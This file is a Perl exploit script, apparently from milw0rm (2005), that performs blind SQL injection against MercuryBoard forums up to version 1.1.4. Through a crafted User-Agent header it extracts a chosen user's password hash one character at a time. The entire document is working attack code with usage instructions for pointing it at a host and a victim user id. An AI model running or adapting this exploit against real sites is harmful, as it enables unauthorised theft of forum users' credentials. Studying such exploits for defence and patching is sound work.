@@ -1,0 +1,163 @@
+#!/usr/bin/perl
+
+### MercuryBoard <=1.1.4, MySQL => 4.1 sql injection exploit by RST/GHC
+### ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+### * note: you need first register on forum for get id and login
+### after what logout from forum and run exploit
+### * note2: edit timestamp in sources if exploit not work ;)
+### ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+### (c)oded by 1dt.w0lf
+### RST/GHC - http://rst.void.ru , http://ghc.ru
+### ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+use IO::Socket;
+use Getopt::Std;
+
+getopts('h:f:b:i:l:p:');
+
+$server    = $opt_h;
+$path      = $opt_f;
+$member_id = $opt_b;
+$hacker_id = $opt_i;
+$hacker_l  = $opt_l;
+$prefix    = $opt_p || 'mb_' ;
+
+if(!$server||!$path||!$member_id||!$hacker_id||!$hacker_l) { &usage; }
+
+$server =~ s!(http:\/\/)!!;
+
+$request  = 'http://';
+$request .= $server;
+$request .= $path;
+
+$s_num = 1;
+$|++;
+$n = 0;
+&head;
+print "\r\n";
+print " [~]      SERVER  : $server\r\n";
+print " [~]  FORUM PATH  : $path\r\n";
+print " [~] ID FOR BRUTE : $member_id\r\n";
+print " [~]    HACKER ID : $hacker_id\r\n";
+print " [~] HACKER LOGIN : $hacker_l\r\n";
+print " [~] TABLE PREFIX : $prefix\r\n\r\n";
+print " [~] SEARCHING PASSWORD ... [|]";
+
+while(1)
+{
+if(&found(47,58)==0) { &found(96,103); } 
+$char = $i;
+if ($char=="0") 
+ { 
+ if(length($allchar) > 0){
+ print qq{\b\b DONE ] 
+ 
+ -------------------------------------------------------------------
+ USER ID : $member_id
+    HASH : $allchar
+ -------------------------------------------------------------------
+ };
+ }
+ else
+ {
+ print "\b\b FAILED ]";
+ }
+ exit();  
+ }
+else 
+ {  
+ $allchar .= chr($char); 
+ }
+$s_num++;
+}
+
+sub found($$)
+ {
+ my $fmin = $_[0];
+ my $fmax = $_[1];
+ if (($fmax-$fmin)<5) { $i=crack($fmin,$fmax); return $i; }
+ 
+ $r = int($fmax - ($fmax-$fmin)/2);
+ $check = "/**/BETWEEN/**/$r/**/AND/**/$fmax";
+ if ( &check($check) ) { &found($r,$fmax); }
+ else { &found($fmin,$r); }
+ }
+ 
+sub crack($$)
+ {
+ my $cmin = $_[0];
+ my $cmax = $_[1];
+ $i = $cmin;
+ while ($i<$cmax)
+  {
+  $crcheck = "=$i";
+  if ( &check($crcheck) ) { return $i; }
+  $i++;
+  }
+ $i = 0;
+ return $i;
+ }
+ 
+sub check($)
+ {
+ $n++;
+ status();
+ $ccheck = $_[0]; 
+ 
+ $user_agent2 = "666',''),($hacker_id, 'board', 0, (SELECT/**/if((ascii(substring((SELECT/**/user_password/**/FROM/**/${prefix}users/**/WHERE/**/user_id=$member_id),$s_num,1)))$ccheck,1119336207,0)), '666.666.666.666', '666', '666')/*";
+
+ $sock2 = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$server", PeerPort => "80");
+ printf $sock2 ("GET %s?a=active HTTP/1.0\nHost: %s\nUser-Agent: %s\nAccept: */*\nConnection: close\n\n",
+ $request,$server,$user_agent2);
+ 
+ while(<$sock2>) 
+  {   
+  #print $_;
+  if (/w=$hacker_id"\>$hacker_l/) { return 1; }
+  } 
+
+ return 0;
+ }
+ 
+sub status()
+{
+  $status = $n % 5;
+  if($status==0){ print "\b\b/]";  }
+  if($status==1){ print "\b\b-]";  }
+  if($status==2){ print "\b\b\\]"; }
+  if($status==3){ print "\b\b|]";  }
+}
+
+sub usage()
+ {
+ &head;
+ print q(
+ USAGE
+    r57mercury.pl [OPTIONS]
+  
+ OPTIONS
+  -h [host]     ~ host where mercury board installed
+  -f [/folder/] ~ folder where mercury board installed
+  -b [user_id]  ~ user id for bruteforce
+  -i [id]       ~ hacker id (hacker must be register on forum)
+  -l [login]    ~ hacker login on forum
+  -p [prefix]   ~ database tables prefix (optional)
+                  default is "mb"
+ E.G.
+  r57mercury.pl -h www.blah.com -f /mercuryboard/ -b 2 -i 3 -l lamer
+ -------------------------------------------------------------------
+ (c)oded by 1dt.w0lf
+ RST/GHC , http://rst.void.ru , http://ghc.ru
+ );
+ exit();
+ }
+sub head()
+ {
+ print q(
+ -------------------------------------------------------------------
+ MercuryBoard <=1.1.4, MySQL => 4.1 sql injection exploit by RST/GHC
+ -------------------------------------------------------------------
+ );
+ }
+
+# milw0rm.com [2005-06-21]
